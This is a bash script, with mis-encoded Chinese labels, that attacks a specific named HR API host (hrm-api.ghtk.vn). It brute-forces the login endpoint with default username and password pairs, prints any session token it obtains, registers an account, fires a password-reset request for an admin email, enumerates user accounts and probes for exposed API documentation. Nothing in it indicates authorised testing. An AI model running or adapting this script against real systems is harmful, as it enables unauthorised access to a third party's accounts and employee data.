#!/bin/bash
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "ğŸ”¥ æ·±åº¦æŒ–æ˜ï¼šhrm-api.ghtk.vnï¼ˆå·²ç¡®è®¤APIç½‘å…³ï¼‰"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

TARGET="hrm-api.ghtk.vn"

echo "[*] æµ‹è¯•1ï¼šç™»å½•æ¥å£çˆ†ç ´"
LOGINS=(
    '{"username":"admin","password":"admin"}'
    '{"username":"admin","password":"admin123"}'
    '{"username":"admin","password":"123456"}'
    '{"username":"test","password":"test"}'
    '{"username":"demo","password":"demo"}'
    '{"username":"ghtk","password":"ghtk123"}'
    '{"email":"admin@ghtk.vn","password":"admin123"}'
)

for login in "${LOGINS[@]}"; do
    echo "  å°è¯•: $login"
    resp=$(curl -sk "https://$TARGET/api/login" -X POST \
        -H "Content-Type: application/json" \
        -d "$login" -m 3 2>&1)
    
    if echo "$resp" | jq -e '.token' >/dev/null 2>&1; then
        echo "    âœ… ç™»å½•æˆåŠŸï¼Token: $(echo $resp | jq -r '.token')"
        echo "$resp" | jq .
    elif echo "$resp" | grep -qiE "token|success|authenticated"; then
        echo "    âš ï¸  å¯èƒ½æˆåŠŸï¼"
        echo "$resp" | head -10
    fi
done

echo ""
echo "[*] æµ‹è¯•2ï¼šæ³¨å†Œæ¥å£ï¼ˆå¯èƒ½æ— éœ€éªŒè¯ï¼‰"
curl -sk "https://$TARGET/api/register" -X POST \
    -H "Content-Type: application/json" \
    -d '{"username":"testuser123","password":"Test123!","email":"test123@test.com"}' -m 3 | jq .

echo ""
echo "[*] æµ‹è¯•3ï¼šå¿˜è®°å¯†ç ï¼ˆä¿¡æ¯æ³„éœ²ï¼‰"
curl -sk "https://$TARGET/api/password/reset" -X POST \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@ghtk.vn"}' -m 3 | jq .

echo ""
echo "[*] æµ‹è¯•4ï¼šç”¨æˆ·æšä¸¾"
for user in admin test demo hr manager; do
    echo -n "  ç”¨æˆ·: $user â†’ "
    resp=$(curl -sk "https://$TARGET/api/user/$user" -m 3 2>&1)
    echo "$resp" | jq -e '.id' >/dev/null 2>&1 && echo "âœ… å­˜åœ¨ï¼" || echo "ä¸å­˜åœ¨"
done

echo ""
echo "[*] æµ‹è¯•5ï¼šAPIæ–‡æ¡£"
DOC_PATHS=(
    "/swagger.json"
    "/swagger-ui.html"
    "/api-docs"
    "/docs"
    "/api/v1/docs"
    "/redoc"
    "/.well-known/openapi.json"
)

for path in "${DOC_PATHS[@]}"; do
    echo -n "  $path â†’ "
    status=$(curl -sk "https://$TARGET$path" -w "%{http_code}" -o /tmp/doc_resp -m 3 2>/dev/null)
    echo "$status"
    if [ "$status" == "200" ]; then
        echo "    âœ… æ‰¾åˆ°APIæ–‡æ¡£ï¼"
        cat /tmp/doc_resp | head -30
    fi
done

echo ""
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
